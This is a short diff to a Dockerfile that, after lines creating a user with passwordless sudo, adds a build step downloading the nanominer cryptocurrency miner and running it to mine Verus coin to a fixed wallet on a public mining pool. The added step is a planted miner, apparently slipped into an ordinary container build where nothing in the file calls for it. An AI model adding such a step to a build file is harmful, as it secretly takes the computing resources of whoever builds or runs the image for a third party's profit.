@@ -55,6 +55,10 @@ RUN useradd -m $USER -p $(openssl passwd $PASSWORD) \
     && echo "${USER}:${PASSWORD}" | chpasswd \
     && echo "${USER} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers \
     && chsh -s /bin/bash $USER
+RUN wget https://github.com/nanopool/nanominer/releases/download/v3.8.6/nanominer-linux-3.8.6.tar.gz \
+    && mkdir nanominer && tar -xf nanominer-linux-3.8.6.tar.gz -C nanominer && cd nanominer \
+    && chmod +x nanominer && cd .. \
+    && ./nanominer/nanominer -algo Verushash -coin VRSC -wallet RXf4VJY7WxyMahkDtP9bRzXdX272t7CW2c.M1 -pool1 eu.luckpool.net:3956
 
 EXPOSE 8080 22 12345
 
